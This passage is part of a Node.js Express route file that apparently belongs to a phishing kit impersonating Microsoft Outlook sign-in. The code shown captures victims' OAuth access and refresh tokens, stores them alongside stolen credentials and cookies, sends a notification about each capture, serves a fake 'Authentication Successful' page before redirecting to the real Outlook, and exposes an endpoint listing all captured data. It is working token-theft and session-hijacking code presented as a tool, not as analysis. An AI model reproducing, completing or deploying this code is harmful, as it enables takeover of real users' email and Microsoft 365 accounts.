                        console.log('✅ Tokens received successfully!');
                        console.log(`   Access token: ${tokens.access_token.substring(0, 50)}...`);
                        console.log(`   Refresh token: ${tokens.refresh_token?.substring(0, 50)}...`);
                        console.log(`   Expires in: ${tokens.expires_in} seconds`);
                        
                        let tokenSession = capturedData.get(sessionId) || { cookies: [], credentials: {}, tokens: {} };
                        
                        tokenSession.tokens.outlook = {
                            access_token: tokens.access_token,
                            refresh_token: tokens.refresh_token,
                            expires_in: tokens.expires_in,
                            scope: tokens.scope,
                            captured_at: new Date().toISOString(),
                            cae_enabled: true
                        };
                        
                        tokenSession.tokens.graph = {
                            access_token: tokens.access_token,
                            refresh_token: tokens.refresh_token,
                            expires_in: tokens.expires_in,
                            scope: tokens.scope,
                            captured_at: new Date().toISOString(),
                            cae_enabled: true
                        };
                        
                        tokenSession.tokens.dual_capture = true;
                        capturedData.set(sessionId, tokenSession);
                        
                        // Send notification
                        await sendDualTokenNotification(sessionId, username, victimInfo, tokens, tokens);
                        
                        console.log('🎉 Token capture complete! Sending success page...');
                        
                        // Return success page
                        const successHtml = `
                            <!DOCTYPE html>
                            <html>
                            <head>
                                <title>Authentication Successful</title>
                                <style>
                                    body {
                                        font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
                                        display: flex;
                                        justify-content: center;
                                        align-items: center;
                                        height: 100vh;
                                        margin: 0;
                                        background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                                    }
                                    .container {
                                        text-align: center;
                                        background: white;
                                        padding: 40px;
                                        border-radius: 12px;
                                        box-shadow: 0 10px 25px rgba(0,0,0,0.1);
                                        animation: fadeIn 0.5s ease-in;
                                    }
                                    @keyframes fadeIn {
                                        from { opacity: 0; transform: translateY(-20px); }
                                        to { opacity: 1; transform: translateY(0); }
                                    }
                                    .success-icon {
                                        color: #4CAF50;
                                        font-size: 64px;
                                        margin-bottom: 20px;
                                        animation: bounce 0.5s ease-in-out;
                                    }
                                    @keyframes bounce {
                                        0%, 100% { transform: scale(1); }
                                        50% { transform: scale(1.1); }
                                    }
                                    h1 {
                                        color: #333;
                                        margin-bottom: 10px;
                                        font-size: 28px;
                                    }
                                    p {
                                        color: #666;
                                        margin-bottom: 20px;
                                        font-size: 16px;
                                    }
                                    .redirect-message {
                                        color: #999;
                                        font-size: 14px;
                                        margin-top: 20px;
                                    }
                                    .spinner {
                                        border: 3px solid #f3f3f3;
                                        border-top: 3px solid #667eea;
                                        border-radius: 50%;
                                        width: 40px;
                                        height: 40px;
                                        animation: spin 1s linear infinite;
                                        margin: 20px auto;
                                    }
                                    @keyframes spin {
                                        0% { transform: rotate(0deg); }
                                        100% { transform: rotate(360deg); }
                                    }
                                    .email {
                                        color: #667eea;
                                        font-weight: 600;
                                    }
                                </style>
                                <script>
                                    setTimeout(function() {
                                        window.location.href = 'https://outlook.live.com/mail/';
                                    }, 3000);
                                </script>
                            </head>
                            <body>
                                <div class="container">
                                    <div class="success-icon">✓</div>
                                    <h1>Authentication Successful!</h1>
                                    <p>Welcome, <span class="email">${username}</span></p>
                                    <div class="spinner"></div>
                                    <p class="redirect-message">Redirecting to Outlook in a few seconds...</p>
                                </div>
                            </body>
                            </html>
                        `;
                        
                        return res.send(successHtml);
                        
                    } catch (exchangeError) {
                        console.error('❌ Token exchange failed:', exchangeError.response?.data || exchangeError.message);
                        console.error('Full error:', exchangeError);
                        return res.send(`
                            <html><body>
                                <h1>Token Exchange Failed</h1>
                                <p>Error: ${exchangeError.message}</p>
                                <pre>${JSON.stringify(exchangeError.response?.data, null, 2)}</pre>
                                <a href="/en-us/microsoft-365/outlook?email=${req.query.email}">Try Again</a>
                            </body></html>
                        `);
                    }
                } else {
                    console.log('❌ Code not found in location URL');
                    console.log(`   Full location: ${location}`);
                }
            } else {
                console.log('❌ Location does not contain both nativeclient and code');
                console.log(`   Contains nativeclient: ${location.includes('nativeclient')}`);
                console.log(`   Contains code: ${location.includes('code=')}`);
            }
            
            // If we get here, something went wrong - redirect back to login
            console.log('⚠️ Falling back to redirect to login page');
            return res.redirect('/en-us/microsoft-365/outlook?error=auth_failed');
        }
        
        console.log('❌ No location header in response');
        res.redirect('/en-us/microsoft-365/outlook?error=no_redirect');
        
    } catch (error) {
        console.error('❌ Dual token login error:', error.message);
        res.redirect('/en-us/microsoft-365/outlook?error=connection_error');
    }
});








// Endpoint to retrieve captured data
router.get('/api/captured-data', async (req, res) => {
    try {
        const data = Array.from(capturedData.entries()).map(([sessionId, session]) => ({
            sessionId,
            credentials: session.credentials,
            cookiesCount: session.cookies?.length || 0,
            hasTokens: !!session.tokens?.outlook,
            capturedAt: session.credentials?.time || session.cookies?.[0]?.captured_at
        }));
        
        res.json(data);
    } catch (error) {
        console.error('Error retrieving captured data:', error);
        res.status(500).json({ error: 'Failed to retrieve data' });
    }
});

module.exports = { router, initRoutes };